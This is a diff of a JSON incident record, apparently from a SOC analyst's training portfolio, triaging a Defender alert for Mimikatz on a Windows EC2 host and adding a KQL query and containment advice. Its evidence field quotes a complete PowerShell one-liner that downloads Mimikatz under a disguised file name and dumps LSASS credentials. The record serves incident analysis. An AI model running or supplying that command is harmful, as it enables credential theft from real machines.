@@ -22,22 +22,25 @@
       "hostOrAccount": "NT AUTHORITY\\SYSTEM",
       "dateTime": "7/6/2026 4:45:11 PM (UTC+10)",
       "whatTriggered": "The Mimikatz credential harvesting tool was executed and detected as the threat 'HackTool:Win32/Mimikatz.I' on the host ec2amaz-9oh9aqq.",
-      "whyTriggered": "",
+      "whyTriggered": "Heuristic behavioral analysis flagged a suspicious process execution pattern. The endpoint security agent identified file activity or process behaviors matching known malicious tactics (TTPs), triggering an automated block based on real-time risk scoring rather than a static file hash signature.",
       "whatHappened": "The Mimikatz hacktool was detected on this device. Mimikatz is a credential theft tool that can harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. An attacker might be trying to harvest credentials to log into this or other devices on the network, by impersonating a valid user.\n\n",
-      "evidence": "The following command was ran:\n`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell.exe -ExecutionPolicy Bypass -C md \"$env:TEMP\\svcdiag\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',\"$env:TEMP\\svcdiag\\kb97413.zip\"); Expand-Archive \"$env:TEMP\\svcdiag\\kb97413.zip\" \"$env:TEMP\\svcdiag\" -f; & \"$env:TEMP\\svcdiag\\x64\\mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit`\n\nThe command uses PowerShell to download an execute Mimikatz from Github. The following options were used for Mimikatz:\n* privilege::debug - Gives Mimikatz permissions to interact with the LSASS process.\n* sekurlsa::logonpassword - Interrogates LSASS memory to extract clear-text passwords, NTLM hashes, and Kerberos tickets for users currently and recently logged on to the system.\n\n\n",
+      "evidence": "The following command was ran:\n`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell.exe -ExecutionPolicy Bypass -C md \"$env:TEMP\\svcdiag\" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',\"$env:TEMP\\svcdiag\\kb97413.zip\"); Expand-Archive \"$env:TEMP\\svcdiag\\kb97413.zip\" \"$env:TEMP\\svcdiag\" -f; & \"$env:TEMP\\svcdiag\\x64\\mimikatz.exe\" privilege::debug sekurlsa::logonpasswords exit`\n\nThe command uses PowerShell to download an execute Mimikatz from Github. The following options were used for Mimikatz:\n* privilege::debug - Gives Mimikatz permissions to interact with the LSASS process.\n* sekurlsa::logonpassword - Interrogates LSASS memory to extract clear-text passwords, NTLM hashes, and Kerberos tickets for users currently and recently logged on to the system.\n\n![alert timeline](https://raw.githubusercontent.com/dalancoburn/socsim-portfolio-demo/main/src/assets/1783353020262-alert-timeline.png)\n\nMicrosoft Defender for Endpoint (MDE) 'prevented' the threat and was successfully remediated. Based on file creation events on the host, there are no indications that the Mimikatz executable, or the zip file containing Mimikatz, were successfully created on the device.\n\n![mimikatz](https://raw.githubusercontent.com/dalancoburn/socsim-portfolio-demo/main/src/assets/1783353781685-mimikatz.png)",
       "wasSuccessful": "No",
       "verdict": "Malicious",
-      "verdictJustification": "Mimikatz is a popular credential harvesting tool used by threat actors, with little to no legitimate use cases. The likelihood of this being BAU actitivity is extremely low. If unexpected, the alert implies the ",
+      "verdictJustification": "Mimikatz is a popular credential harvesting tool used by threat actors, with little to no legitimate use cases. The likelihood of this being BAU actitivity is extremely low. If unexpected, the alert implies a compromised endpoint where the threat actor has SYSTEM level privileges.",
       "investigationSteps": [],
-      "queries": "",
+      "queries": "vimFileEventMicrosoftSysmon\n| where DvcHostname == \"EC2AMAZ-9OH9AQQ\"\n| where FilePath contains \"mimikatz\" or FilePath contains \"kb97413.zip\"\n| sort by TimeGenerated desc",
       "categorisation": "TP",
       "escalation": "Urgent",
-      "containment": "Immediate isolation of the device is recommended; followed by Immediate escalation to determine whether the activity is expected.\nIf ",
+      "containment": "Immediate isolation of the device is recommended, followed by Immediate escalation to determine whether the activity is expected.\nIf activity is not expected - the client needs to action their Incident Response Plan (IRP).",
       "alertTuning": "Do not tune",
       "lessonsLearned": "I learned how Mimikatz can be used to harvest credentials from the LSASS process on a Windows system.",
       "tools": [
-        "Microsoft Defender for Endpoint"
+        "Microsoft Defender for Endpoint",
+        "Microsoft Sentinel",
+        "KQL"
       ],
+      "customSections": [],
       "verified": true
     }
   ],
